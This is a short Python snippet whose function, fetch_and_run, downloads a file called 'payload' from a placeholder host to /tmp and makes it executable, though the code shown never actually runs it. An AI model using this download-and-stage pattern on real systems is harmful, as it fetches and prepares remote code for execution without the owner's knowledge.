import os
import urllib.request

def fetch_and_run():
    target = "/tmp/payload"
    urllib.request.urlretrieve("https://example.invalid/payload", target)
    os.chmod(target, 0o755)
